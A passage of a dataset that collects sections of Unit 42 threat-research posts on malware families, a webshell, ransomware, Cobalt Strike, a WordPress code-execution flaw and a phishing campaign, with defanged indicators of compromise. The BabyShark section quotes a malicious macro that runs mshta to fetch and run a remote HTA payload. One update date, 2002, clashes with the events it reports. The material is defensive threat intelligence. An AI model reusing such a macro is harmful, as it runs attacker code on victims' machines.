\nhttps://www.deepdotweb.com/tag/arrested/ \nhttps://www.ag.gov.au/RightsAndProtections/IdentitySecurity/Pages/Trends-in-Identity-Crime.aspx \nhttp://cybersecurityventures.com/hackerpocalypse-cybercrime-report-2016/ \nhttps://www.juniperresearch.com/press/press-releases/cybercrime-cost-businesses-over-2trillion \nhttps://www.afp.gov.au/what-we-do/crime-types/fraud/identity-crime \nhttp://www.abs.gov.au/ausstats/abs@.nsf/mf/4528.0/ \nhttps://www.ag.gov.au/RightsAndProtections/IdentitySecurity/Documents/Identity-crime-and-misuse-in-Australia-2016.pdf \nhttp://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf \nhttps://www.paloaltonetworks.com/products/designing-for-prevention/security-platform", "source": "Palo"}, {"title": "Introduction", "content": "When malware wants to communicate home, most use domain names, allowing them to resolve host names to IP addresses of their servers. In order to increase the likelihood of their malware successfully communicating home, cyber espionage threat actors are increasingly abusing legitimate web services, in lieu of DNS lookups to retrieve a command and control address. This negates the requirement to make DNS requests for domains that may be considered malicious and are therefore blocked. For attackers, that's an advantage because it allows their initial communications channel to be obscured amongst other traffic to legitimate services.\nThis blog post examines two similar malware families that utilize the aforementioned technique to abuse legitimate websites, their connections to each other, and their connections to known espionage campaigns. The first of which we call 'CONFUCIUS_A', a malware family that has links to a series of attacks associated with a backdoor attack method commonly known asSNEEPY(aka ByeByeShell) first reported by Rapid7 in 2013. The second of which we call 'CONFUCIUS_B', which has a loose link to the series of attacks associated withOperation PatchworkandThe Hangover Report.", "source": "Palo"}, {"title": "Conclusion", "content": "In this blog post, we discussed two separate malware variations that behave in very similar ways and use similar techniques to acquire a C2 address, with both using Yahoo Answers and Quora to evade traditional mechanisms for blocking command and control domains. Although we cannot link the two clusters of activity by their infrastructure, the technique used to resolve domains is unusual. We also believe that both clusters of activity have links to attacks with likely Indian origins, the CONFUCIUS_A attacks are linked to the use of SNEEPY/BYEBYESHELL and the CONFUCIUS_B have a loose link to Hangover. The two malware families themselves are also very similar, and therefore we think that the shared technique is an indication of a single developer, or development company, behind both CONFUCIUS_A and CONFUCIUS_B. It is likely that the two clusters of activity are operated by two different operators; however, as the command and control infrastructure used by each cluster differs in the choices of hosting providers.\nPalo Alto Networks AutoFocus customers can further explore these malware families and related campaigns with the tags:\nConfucious_A \nConfucious_B \nApacheStealer \nSneepy\nAll samples discussed in the blog and those in the appendix are detected as malicious by Wildfire.\nIPS customers are protected by IPS signature 14150.\nExemplary hashes, command and control domains and resolver URL's are given below.\nSHA256 List:\nResolver URL list:\nhttps://www.quora.com/Is-bingle-hate-and-love-the-green-or-it-fire-couple-fire-tell-me-you-like-or-couple-weed-or-hate-weed-with-deedy-love-claggy-1https://answers.yahoo.com/question/index?qid=20160301074835AA7cF60&sort=Nhxxps://in.answers.yahoo.com/question/index?qid=20160229024628AA4XQ7rhxxp://www.nefuri.com/hi_is_bingle_hate_and_love_the_green_or_it_fire_couple_fire_tell_me_you_like_or_couple_weed_or_hate_weed_with_deedy_block_claggy_1562153.htmlhxxp://www.answerlib.org/qv/20160229115557AAXc2Ib.htmlhxxps://in.answers.yahoo.com/question/index?qid=20160229115557AAXc2Ibhxxps://www.question.com/what-are-the-precautions-for-diphtheria-tetanus-998506.htmlhxxp://findnerd.com/list/view/How-to-make-a-simple-settings-page-in-android/15891/hxxp://able2know.org/topic/312620-1hxxp://bs71.blog.com/2016/03/01/performing-namaz/hxxp://www.linkibl.com/l/define-simple-support-boundary-condition-of-a-beam-solid-mechanicshxxp://www.education.com/question/working-model-depict-buoyancy/hxxp://www.quora.com/Where-can-I-find-Port-de-Vairehxxp://www.fixya.com/support/t25556697-intel_desktop_board_dh67cl_having_vgahxxp://www.education.com/question/scientist-calculate-distance-planetshxxp://technology.blurtit.com/4492774/import-mri-ct-and-microct-datahxxp://bs71.blog.com/2016/03/01/performing-namaz/hxxp://www.linkibl.com/l/define-simple-support-boundary-condition-of-a-beam-solid-mechanicshxxps://www.quora.com/Is-bingle-hate-and-love-the-green-or-it-fire-couple-fire-tell-me-you-like-or-couple-weed-or-hate-weed-with-deedy-love-claggy-1hxxps://www.quora.com/How-fertilization-takes-place-in-Plants", "source": "Palo"}, {"title": "Introduction", "content": "While investigating a recent security incident, Unit 42 found a webshell that we believe was used by the threat actor to remotely access the network of a targeted Middle Eastern organization. The construction of the webshell was interesting by itself, as it was actually two separate webshells: an initial webshell that was responsible for saving and loading the second fully functional webshell. It is this second webshell that enabled the threat actor to run a variety of commands on the compromised server. Due to these two layers, we use the name TwoFace to track this webshell.\nDuring our analysis, we extracted the commands executed by the TwoFace webshell from the server logs on the compromised server. Our analysis shows that the commands issued by the threat actor date back to June 2016; this suggests that the actor had access to this shell for almost an entire year. The commands issued show the actor was interested in gathering credentials from the compromised server using the Mimikatz tool. We also saw the attacker using the TwoFace webshell to move laterally through the network by copying itself and other webshells to other servers.", "source": "Palo"}, {"title": "Conclusion", "content": "The TwoFace webshell has an effective two-layer approach that makes it difficult to detect. Coupled with the multiple layers and inclusion of legitimate website content that displays correctly in the browser, the threat actors are able to enjoy long periods of persistent access to a network without detection as evidenced by their demonstrated ability to access and manipulate a compromised system for nearly a year. Based on the commands issued to TwoFace, the threat actors used this webshell to deliver variants of the Mimikatz tool to gather the passwords of logged on accounts. The actor also used TwoFace to move laterally by copying webshells to other remote systems on the network.\nTwoFace Loader SHA256\ned684062f43d34834c4a87fdb68f4536568caf16c34a0ea451e6f25cf1532d51f4da5cb72246434decb8cf676758da410f6ddc20196dfd484f513aa3b6bc4ac59a361019f6fbd4a246b96545868dcb7908c611934c41166b9aa93519504ac813d0ffd613b1b285b15e2d6c038b0bd4951eb40eb802617cf6eb4f56cda4b023e3\nTwoFace++ Loader SHA256\nbca01f14fb3cb4cfbe7f240156feebc55abac73a6c96b9f75da2f9df580101ef8d178b9730e09e35c071526bfb91ce72f876797ebc4e81f0bc05e7bb8ad1734e\nTwoFace Payload SHA256\n8f0419493da5ba201429503e53c9ccb8f8170ab73141bdc6ae6b9771512ad84b0a77e28e6d0d7bd057167ca8a63da867397f1619a38d5c713027ebb22b784d4f54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f818ac924fd8f7bc1b6062a8ef456226a47c4c59d2f9e38eda89fff463253942ffd47825d75e3da3e43dc84f425178d6e834a900d6b2fd850ee1083dbb1e5b11379c9a2a2b596f8270b32f30f3e03882b00b87102e65de00a325b64d30051da4ee33096ab328949af19c290809819034d196445b8ed0406206e7418ec96f66b68c116f078a0b9ea25c5fdb2e72914c3446c46f22d9f2b37c582600162ed711b69\nIntrudingDivisor Shell SHA256\ne342d6bf07de1257e82f4ea19e9f08c9e11a43d9ad576cd799782f6e968914b849f43f2caaea89bd3bb137f4228e543783ef265abbdc84e3743d93a7d30b0a7e\nMimikatz SHA256\nf17272d146f4d46dda5dc2791836bfa783bdc09ca062f33447e4f3a26f26f4e0", "source": "Palo"}, {"title": "Introduction", "content": "In recent months, our team has been tracking a keylogger malware family named KeyBase that has been in the wild since February 2015. The malware comes equipped with a variety of features and can be purchased for $50 directly from the author. It has been deployed in attacks against organizations across many industries and is predominantly delivered via phishing emails.\nIn total, Palo Alto NetworksAutoFocusthreat intelligence service identified 295 unique samples over roughly 1,500 unique sessions in the past four months. Attacks have primarily targeted the high tech, higher education, and retail industries.", "source": "Palo"}, {"title": "Conclusion", "content": "Overall, this KeyBase malware is quite unsophisticated. It lacks a number of features available in some of the more popular malware families, and the C2 web panel contains security vulnerabilities that could allow a third party to gain unauthorized access. The builder for KeyBase provides an easy-to-use, user-friendly interface; however, a number of options are hardcoded into the malware itself. Some examples include the filename KeyBase uses when it is copied to maintain persistence, and various URI paths it uses during the command and control phase.\nWhile this malware has some issues with sophistication, Unit 42 has observed a significant and continued rise in usage by attackers, generally targeting the high tech, higher education, and retail industries. Palo Alto Networks customers are protected via WildFire, which is able to detect KeyBase as malicious. Readers may also use the indicators provided to deploy protections.\nFor a list of sample hashes and their associated domains and IP addresses, please see the followinglink.", "source": "Palo"}, {"title": "Introduction", "content": "Ransom Cartel is ransomware as a service (RaaS) that surfaced in mid-December 2021. This ransomware performsdouble extortionattacks and exhibits several similarities and technical overlaps with REvil ransomware. REvil ransomware disappeared just a couple of months before Ransom Cartel surfaced and just one month after 14 of its alleged members werearrested in Russia. When Ransom Cartel first appeared, it was unclear whether it was a rebrand of REvil or an unrelated threat actor who reused or mimicked REvil ransomware code.\nIn this report, we will provide our analysis of Ransom Cartel ransomware, as well as our assessment of the possible connections between REvil and Ransom Cartel ransomware.\nPalo Alto Networks customers receive help with the detection and prevention of Ransom Cartel ransomware through the following products and services:Cortex XDRandNext-Generation Firewalls(includingcloud-delivered security servicessuch asWildFire).\nIf you think a cyber incident may have impacted you, theUnit 42 Incident Response teamis available 24/7/365. You can also take preventative steps by requesting any of ourcyber risk management services.\nIndicators of compromise and Ransom Cartel-associated tactics, techniques and procedures (TTPs) can be found in theRansom Cartel ATOM.\nWe updated this blog on Oct. 15 based on further analysis, additional evidence and discussion around the complexities of redirects from REvil's dark web leak site. Updated sections include ourHistory of the REvil Disappearanceand theRansom Cartel Overview.", "source": "Palo"}, {"title": "Conclusion", "content": "Ransom Cartel is one of many ransomware families that surfaced during 2021. While Ransom Cartel uses double extortion and some of the same TTPs we often observe during ransomware attacks, this type of ransomware uses less common tools \u2013 DonPAPI for example \u2013 that we haven't observed in any other ransomware attacks.\nBased on the fact that the Ransom Cartel operators clearly have access to the original REvil ransomware source code, yet likely do not possess the obfuscation engine used to encrypt strings and hide API calls, we speculate that the operators of Ransom Cartel had a relationship with the REvil group at one point, before starting their own operation.\nDue to the high-profile nature of some organizations targeted by Ransom Cartel and steady stream of Ransom Cartel cases identified by Unit 42, the operator and/or affiliates behind the ransomware likely will continue to attack and extort organizations.\nPalo Alto Networks customers receive help with detection and prevention of Ransom Cartel ransomware in the following ways:\nWildFire: All known samples are identified as malware. \nCortex XDR:Identifies indicators associated with Ransom Cartel.Anti-Ransomware Module to detect Ransom Cartel encryption behaviors on Windows.Local Analysis detection for Ransom Cartel binaries on Windows. \nIdentifies indicators associated with Ransom Cartel. \nAnti-Ransomware Module to detect Ransom Cartel encryption behaviors on Windows. \nLocal Analysis detection for Ransom Cartel binaries on Windows. \nNext-Generation Firewalls: DNS Signatures detect the known command and control domains, which are also categorized as malware inAdvancedURL Filtering.\nIf you think you may have been compromised or have an urgent matter, you can get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "Indicators", "content": "Ransom Cartel Samples\n9935DA29F3E4E503E4A4712379CCD9963A730CCC304C2FEC31E8276DB35E82E8BF93B029CCA0DE4B6F32E98AEEBD8FD690964816978A0EB13A085A80D4B6BF4E55e4d509de5b0f1ea888ff87eb0d190c328a559d7cc5653c46947e57c0f01ec52411a74b343bbe51b2243985d5edaaabe2ba70e0c923305353037d1f442a91f5\nNetwork-based IoCs\n185.239.222[.]240TOR Exit Node108.62.103[.]193TOR Exit Node185.129.62[.]62TOR Exit Node185.143.223[.]13Bulletproof hosting server185.253.163[.]23PIA VPN exit node\nIndicators of compromise and Ransom Cartel-associated TTPs can be found in the Ransom CartelATOM.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nUpdated Oct. 15, 2002, at 11:15 a.m. PT.", "source": "Palo"}, {"title": "Introduction", "content": "BabyShark is a relatively new malware. The first sample we observed is from November 2018. The decoy contents of all malicious documents delivering BabyShark were written in English and were related to Northeast Asia's regional security issues.\nFigure 2 Timeline of BabyShark malicious documents and filename / decoys\nWhile some decoys used content which is publicly available information on the internet, some used content which appears to not be public. Inspecting the metadata of the documents with this non-public content, we suspect that the threat actor likely compromised someone with access to private documents at a U.S. national security think tank.\nFigure 3 Decoy content copied from the internet\nFigure 4 Decoy content not publicly available on the internet (intentionally obfuscated)\nThe malicious documents contain a simple macro which would load the BabyShark's first stage HTA at a remote location.\nSub AutoOpen()\nShell (\"mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta\")\nEnd Sub", "source": "Palo"}, {"title": "Conclusion", "content": "BabyShark is being used in a limited spear phishing campaign which started in November 2018 and is still ongoing. The threat actor behind it has a clear focus on gathering intelligence related to Northeast Asia's national security issues. Well-crafted spear phishing emails and decoys suggest that the threat actor is well aware of the targets, and also closely monitors related community events to gather the latest intelligence. While not conclusive, we suspect that the threat actor behind BabyShark is likely connected to the same actor who used the KimJongRAT malware family, and at least shares resources with the threat actor responsible for the STOLEN PENCIL campaign. We also noticed testing indicating the attackers are working on a PE loader for BabyShark. The threat actor may use different methods to deliver BabyShark in the future campaigns.\nPalo Alto Networks customers are protected from this threat in the following ways:\nWildFire and Traps detect all the malware supported in this report as malicious. \nC2 domains used by the attackers are blocked via Threat Prevention.\nAutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the following tag:\nBabyShark\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit cyberthreatalliance.org.", "source": "Palo"}, {"title": "Indicators", "content": "Malicious Documents:\n7b77112ac7cbb7193bcd891ce48ab2acff35e4f8d523980dff834cb42eaffafa\n9d842c9c269345cd3b2a9ce7d338a03ffbf3765661f1ee6d5e178f40d409c3f8\n2b6dc1a826a4d5d5de5a30b458e6ed995a4cfb9cad8114d1197541a86905d60e\n66439f0e377bbe8cda3e516e801a86c64688e7c3dde0287b1bfb298a5bdbc2a2\n8ef4bc09a9534910617834457114b9217cac9cb33ae22b37889040cde4cabea6\n331d17dbe4ee61d8f2c91d7e4af17fb38102003663872223efaa4a15099554d7\n1334c087390fb946c894c1863dfc9f0a659f594a3d6307fb48f24c30a23e0fc0\ndc425e93e83fe02da9c76b56f6fd286eace282eaad6d8d497e17b3ec4059020a\n94a09aff59c0c27d1049509032d5ba05e9285fd522eb20b033b8188e0fee4ff0", "source": "Palo"}, {"title": "Introduction", "content": "Cobalt Strike is commercial threat emulation software that mimics a quiet, long-term embedded actor in a network. This actor, known as Beacon, communicates with an external team server to emulate command-and-control (C2) traffic. Due to its versatility, Cobalt Strike is commonly used as a legitimate tool by red teams \u2013 but is also widely used by threat actors for real-world attacks. Different elements of Cobalt Strike contribute to its versatility, including the processes that encrypt and decrypt metadata sent to the C2 server.\nIn a previous blog, \"Cobalt Strike Analysis and Tutorial: CS Metadata Encoding and Decoding,\" we learned that the encrypted metadata is encoded for an HTTP transaction.\nWhen Cobalt Strike's Beacon \"phones home,\" it encrypts metadata \u2013 information about the compromised system \u2013 with the RSA algorithm public key and sends it to the Cobalt Strike TeamServer. The TeamServer will use the private key to recover the Beacon plaintext metadata to differentiate the Beacon clients. Also, the AES symmetric key can be extracted from decrypted metadata. The client and server can use the AES key to encrypt and decrypt the further request and response data to finish the C2 traffic communication.\nIn this blog post, we will detail and demonstrate the data encryption and decryption algorithm, key generation and extraction, metadata encryption and decryption, and metadata schema definitions. One of the interesting components is how the encryption and decryption algorithm works during C2 traffic communication \u2013 and why this versatility makes Cobalt Strike an effective emulator that is difficult to defend against.", "source": "Palo"}, {"title": "Conclusion", "content": "Cobalt Strike is a potent post-exploitation adversary emulator. The metadata encryption/decryption detailed above are elaborate and are designed to evade security detections. A single security appliance is not well-suited to prevent a Cobalt Strike attack. Only a combination of security solutions \u2013 firewalls, sandboxes, endpoints and the appropriate software to integrate all these components \u2013 can help prevent an attack of this nature.\nPalo Alto Networks customers receive protections from attacks similar to those by Cobalt Strike with the help of:\nNext-Generation Firewalls(NGFW) withThreat Preventionsignatures 86445 and 86446 identify HTTP C2 requests with the base64 metadata encoding in default profiles. Advanced Threat Prevention has new capabilities to detect these attacks without the need for signatures. \nWildFire, an NGFW security subscription, andCortex XDRidentify and block Cobalt Strike Beacon. \nAutoFocususers can track this activity using theCobaltStriketag", "source": "Palo"}, {"title": "Indicators", "content": "CS Samples\n50ea11254f184450a7351d407fbb53c54686ce1e62e99c0a41ee7ee3e505d60c\nCS Beacon Samples\n/lNj8SHA256 Hash:e712d670382ad6f837feeb5a66adb2d0f133481b5db854de0dd4636d7e906a8e \nSHA256 Hash:e712d670382ad6f837feeb5a66adb2d0f133481b5db854de0dd4636d7e906a8e \ne712d670382ad6f837feeb5a66adb2d0f133481b5db854de0dd4636d7e906a8e\nCS TeamServer IP addresses\n92.255.85[.]93", "source": "Palo"}, {"title": "Introduction", "content": "This research reviews an attack vector allowing the compromise of GitHub repositories, which not only has severe consequences in itself but could also potentially lead to high-level access to cloud environments. This is made possible through the abuse of GitHub Actions artifacts generated as part of organizations' CI/CD workflows. A combination of misconfigurations and security flaws can make artifacts leak tokens, both of third party cloud services and GitHub tokens, making them available for anyone with read access to the repository to consume. This allows malicious actors with access to these artifacts the potential of compromising the services to which these secrets grant access. In most of the vulnerable projects we discovered during this research, the most common leakage is of GitHub tokens, allowing an attacker to act against the triggering GitHub repository. This potentially leads to the push of malicious code that can flow to production through the CI/CD pipeline, or to access secrets stored in the GitHub repository and organization.\nWhile the research applies to both private and public GitHub repositories, this article focuses on the discovery of vulnerable public repositories. We uncover high-profile open-source projects owned by the biggest companies in the world, which before mitigation could have led to a potential impact on millions of their consumers. All of the disclosed cases were reported to the maintainers of these projects. We received great support from all teams, and were able to collaborate to mitigate all of the discoveries quickly and efficiently.\nCI/CD environments, processes and systems are an essential part of modern software organizations. They're responsible for the crucial flow of building, testing and delivering code to production. Naturally, CI/CD pipelines use highly sensitive credentials to authenticate against various types of services, creating a significant challenge to keep a high-level ofcredential hygiene. This article covers the potential impact of insecure usage of GitHub Actions artifacts, as well as the methods and tools to protect against this threat.\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nPrisma Cloudcustomers are better protected by theattack path policiescontinuously monitoring and alerting on potential attack paths. \nThe Unit 42 Incident Response teamcan also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Conclusion", "content": "As this research shows, we have a gap in the current security conversation regarding artifact scanning. GitHub's deprecation of Artifacts V3 should prompt organizations using the artifacts mechanism to reevaluate the way they use it.\nSecurity defenders must adopt a holistic approach, meticulously scrutinizing every stage - from code to production - for potential vulnerabilities. Overlooked elements like build artifacts often become prime targets for attackers.\nReduce workflow permissions of runner tokens according to least privilege and review artifact creation in your CI/CD pipelines. By implementing a proactive and vigilant approach to security, defenders can significantly strengthen their project's security posture.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 for the past three months has been tracking a banking Trojan targeting victims in Brazil and the United States. Escelar originally surfaced in January of this year, and has since had roughly 100,000 instances of attempted infections.\nAttackers deliver the Trojan using generic Portuguese language phishing emails and are currently targeting seven Brazilian banks. Once delivered, Escelar has multiple installation stages where malware is downloaded using direct connections to multiple Microsoft SQL servers. These SQL servers are also used for command and control (C2) functionality.\nThe most recently discovered Microsoft SQL server being used as Escalar infrastructure contained records of 1660 infections that all connected in a two-day time frame.\nThe malware is able to control banking transactions conducted using Internet Explorer, and harvest email credentials, which are in turn used to spread the malware further.\nFigure 1. AutoFocus map of victims receiving Escalar Trojan", "source": "Palo"}, {"title": "Conclusion", "content": "The Escelar threat has been active for approximately seven months, targeting primarily Brazil- and US-based users. We have collected over 600 variants of to date, with roughly 100,000 attempted infections. The malware provides the attacker with multiple capabilities, including the ability to harvest email credentials and manipulate banking transaction sessions. Additionally, due to the way the malware is architected, it can easily update itself, along with the infrastructure supporting it.\nUsers located in Brazil and the United States that use Brazilian banking services should be aware of this threat and take necessary precautions against it, such as ensuring that suspicious emails are not opened.\nPalo Alto Networks customers using theAutoFocusservice can use theEscelartag to determine if they have been impacted and conduct additional analysis, and customers usingWildFireorTrapswith WildFire integration are automatically protected against this threat. Organizations should monitor their networks for unexpected outbound Microsoft SQL traffic (App-ID mssql) that may indicate an Escelar infection.\nFor a list of SHA256 hashes of identified instances of Escelar and identified Microsoft SQL server domains being used by Escelar, please refer tothis link.", "source": "Palo"}, {"title": "Introduction", "content": "The root cause is located at social-warfare\\lib\\utilities\\SWP_ Database_Migration.php:\nFigure 1. WordPress Social Warfare handle $_GET['swp_url']\nFigure 1 shows that the $array is constructed by $options which in turn came from a remote file located in $_GET['swp_url']. We can see in line 250 in Figure 1, the $array will be executed by eval() function without any security checks, which causes the arbitrary code execution.", "source": "Palo"}, {"title": "Conclusion", "content": "There are many exploits in the wild for the Social Warfare plugin and it is likely they will continue to be used maliciously. Since over 75 million websites are using WordPress and many of the high traffic WordPress websites are using the Social Warfare plugin, the users of those websites could be exposed to malware, phishing pages or miners. Website administrators should to update the Social Warfare plugin to 3.5.3 or newer version.\nPalo Alto Networks customers are protected from those two vulnerabilities by the following products and services:\nThreat Prevention Signature 55424 \nPAN-DB blocks attacker's C&C server IP and domain \nWildFire and Antivirus identifies and blocks exploitation payload\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visitwww.cyberthreatalliance.org.", "source": "Palo"}, {"title": "IOC", "content": "Pastebin[.]com/0yJzqbYf\nwww[.]viamarkt[.]hu/readme[.]txt\nnetlabs[.]gr//images/code[.]txt\nwww[.]acne-school[.]ru//sites/all/modules/webform/tests/subform[.]txt\nWww[.]tekmat[.]net/wp-content/uploads/2014/04/jpg[.]txt\nCustomcoverinc[.]com/images/banners/shopreadme[.]txt\n37[.]59[.]55[.]45\n192[.]99[.]35[.]149\n192[.]99[.]35[.]63\n94[.]23[.]255[.]34\n8[.]47[.]64[.]2", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers recently investigated a phishing campaign targeting European companies, including in Germany and the UK. Our investigation revealed that the campaign aimed to harvest account credentials and take over the victim's Microsoft Azure cloud infrastructure.\nThe campaign's phishing attempts peaked in June 2024, with fake forms created using the HubSpot Free Form Builder service. Our telemetry indicates the threat actor successfully targeted roughly 20,000 users across various European companies.\nOur investigation revealed that while the campaign appears to have begun in June 2024, the phishing campaign was still active as of September 2024. The campaign targeted European companies in the following industries:\nAutomotive \nChemical \nIndustrial compound manufacturing\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products and services:\nAdvanced WildFire \nAdvanced URL FilteringandAdvanced DNS Security \nCortex XDRandXSIAM \nUnit 42 Managed Services Team\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "In this article, we reviewed a phishing campaign that targeted European companies, including German and UK automakers and chemical manufacturing organizations. Threat actors directed the phishing campaign to target the victim's Microsoft Azure cloud infrastructure via credential harvesting attacks on the phishing victim's endpoint computer. They then followed this activity with lateral movement operations to the cloud.\nThe campaign's phishing operation, which leveraged HubSpot Free Form builder services, peaked in June 2024. We believe the threat actor successfully compromised multiple victims in different companies across the targeted countries.\nUnit 42 researchers have an open dialogue with HubSpot in relation to the phishing operations leveraging their services and have worked with them to develop notifications and mitigation strategies. We have also worked with the compromised organizations to ensure they have the resources they need to recover from the phishing operation.\nDetection and Mitigations\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this group:\nAdvanced WildFirecloud-delivered malware analysis service accurately identifies the known samples as malicious. \nAdvanced URL FilteringandAdvanced DNS Securityidentify domains associated with this group as malicious. \nCortex XDRandXSIAMdetect user and credential-based threats by analyzing user activity from multiple data sources including endpoints, network firewalls, Active Directory, identity and access management solutions, and cloud workloads. Cortex builds behavioral profiles of user activity over time with machine learning. By comparing new activity to past activity, peer activity and the expected behavior of the entity, Cortex detects anomalous activity indicative of credential-based attacks. \nUnit 42 Managed Detection and Response Servicedelivers continuous 24/7 threat detection, investigation and response/remediation to customers of all sizes globally.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "HubSpot Free Form URL Links\nhxxps://share-eu1.hsforms[.]com/1P_6IFHnbRriC_DG56YzVhw2dz72l \nhxxps://share-eu1.hsforms[.]com/1UgPJ18suRU-NEpmYkEwteg2ec0io \nhxxps://share-eu1.hsforms[.]com/12-j0Y4sfQh-4pEV6VKVOeg2dzmbq \nhxxps://share-eu1.hsforms[.]com/1cJJXJ0NfTPOKwn23oAmmzQ2e901x \nhxxps://share-eu1.hsforms[.]com/1wg25r1Z-R5GkhY6k-xGzOg2dvcv5 \nhxxps://share-eu1.hsforms[.]com/1G-NQN9DbSVmDy1HDeovJCQ2ebgc6 \nhxxps://share-eu1.hsforms[.]com/1AEc2-gS4TuyQyAiMQfB5Qw2e5xq0 \nhxxp://share-eu1.hsforms[.]com/1wg25r1Z-R5GkhY6k-xGzOg2dvcv5 \nhxxps://share-eu1.hsforms[.]com/1zP2KsosARaGzLqdj2Umk6Q2ekgty \nhxxps://share-eu1.hsforms[.]com/1fnJ8gX6kR_aa5HlRyJhuGw2ec8i2 \nhxxps://share-eu1.hsforms[.]com/1QPAfZcocSuu3AnqznjU14A2eabj0 \nhxxps://share-eu1.hsforms[.]com/176T8k3N9Q562OEEfhS22Fg2ebzvj \nhxxps://share-eu1.hsforms[.]com/18wO3Zb9hTIuittmhHvQFuQ2ec8gt \nhxxps://share-eu1.hsforms[.]com/1vNr8tB1GS4mZuYg81ji3dg2e08a3 \nhxxps://share-eu1.hsforms[.]com/1qe8ypRpdTr284rkNpgmoow2ebzty \nhxxps://share-eu1.hsforms[.]com/1C1IZ0_b-SD6YXS66alL4EA2e90m9\nPhishing Infrastructure URLs - Level 1\nhxxps://technicaldevelopment.industrialization[.]buzz/?o0B=RLNT \nhxxps://vigaspino[.]com/2doc5/index.php?submissionGuid=1d51a08d-cf55-4146-8b5b-22caa765ac85 \nhxxps://technicaldevelopment.rljaccommodationstrust[.]buzz/?WKg=2Ljv8 \nhxxps://purchaseorder.vermeernigeria[.]buzz/?cKg=C3&submissionGuid=4631b0c9-5e10-4d81-b1d6-4d01045907e7 \nhxxps://asdrfghjk3wr4e5yr6uyjhgb.mhp-hotels[.]buzz/?Nhv3zM=xI7Kyf \nhxxps://purchaseorder.europeanfreightleaders[.]buzz/?Mt=zqoE&submissionGuid=476f32d0-e667-4a18-830b-f57a2b401fc3 \nhxxps://orderspecification.tekfenconstruction[.]buzz/?6BI=AmaPH&submissionGuid=e2ce33ea-ee47-4829-882c-592217dea521 \nhxxps://asdrfghjk3wr4e5yr6uyjhgb.mhp-hotels[.]buzz/?Nhv3zM=xI7Kyf \nhxxps://d2715zbmeirdja.cloudfront[.]net/?__hstc=251652889.fcaff35c15872a69c6757196acd79173.1727206111338.1727206111338.1727206111338.1&__hssc=251652889.158.1727206111338&__hsfp=1134454612&submissionGuid=30359eaf-a821-472d-ba17-dd2bd0d96b96 \nhxxps://docusharepoint.fundament-advisory[.]buzz/?3aGw=Nl9 \nhxxps://wr43wer3ee.cyptech[.]com[.]au/oeeo4/ewi9ew/mnph_term=?/&submissionGuid=50aa078a-fb48-4fec-86df-29f40a680602 \nhxxp://orderconfirmation.dgpropertyconsultants[.]buzz/ \nhxxps://espersonal[.]org/doc0024/index.php?submissionGuid=6e59d483-9dc2-48f8-ad5a-c2d2ec8f4569 \nhxxps://vigaspino[.]com/2doc5/index.php?submissionGuid=093410a5-c228-4ddf-890c-861cdc6fe5d8 \nhxxps://technicaldevelopment.industrialization[.]buzz/?o0B=RLNT \nhxxps://espersonal[.]org/doc0024/index.php?submissionGuid=96a9b82a-55d3-402d-9af4-c2c5361daf5c \nhxxps://orderconfirmating.symmetric[.]buzz/?df=ZUvkMN&submissionGuid=e06a1f83-c24e-4106-b415-d2f43a06a048\nPhishing Infrastructure URLs - Level 2\nhxxps://docs.doc2rprevn[.]buzz?username= \nhxxps://docusharepoint.fundament-advisory[.]buzz/?3aGw=Nl9 \nhxxps://9qe.daginvusc[.]com/miUxeH/ \nhxxps://docs.doc2rprevn[.]buzz/?username= \nhxxps://vomc.qeanonsop[.]xyz/?hh5=IY&username=ian@deloitte.es \nhxxps://sensational-valkyrie-686c5f.netlify[.]app/?e=\nIP Addresses\n167.114.27[.]228 \n144.217.158[.]133 \n208.115.208[.]118 \n13.40.68[.]32 \n18.67.38[.]155 \n91.92.245[.]39 \n91.92.244[.]131 \n91.92.253[.]66 \n94.156.71[.]208 \n91.92.242[.]68 \n91.92.253[.]66 \n188.166.3[.]116 \n104.21.25[.]8 \n172.67.221[.]137 \n49.12.110[.]250 \n74.119.239[.]234 \n208.91.198[.]96 \n94.46.246[.]46\nPDFs\n(Zoomtan.pdf) b2ca9c6859598255cd92700de1c217a595adb93093a43995c8bb7af94974f067 \n(Belzona.pdf) f3f0bf362f7313d87fcfefcd6a80ab0f18bc6c5517d047be186f7b81a979ff91 \n(Pcc.pdf) deff0a6fbf88428ddef2ee3c4d857697d341c35110e4c1208717d9cce1897a21", "source": "Palo"}, {"title": "Introduction", "content": "As reported by both Microsoft and Intel Security, the malware is installed in a very targeted manner and appears to be in use post-compromise. First, the attacker will gain unauthorized access to a victim network, then begin mapping 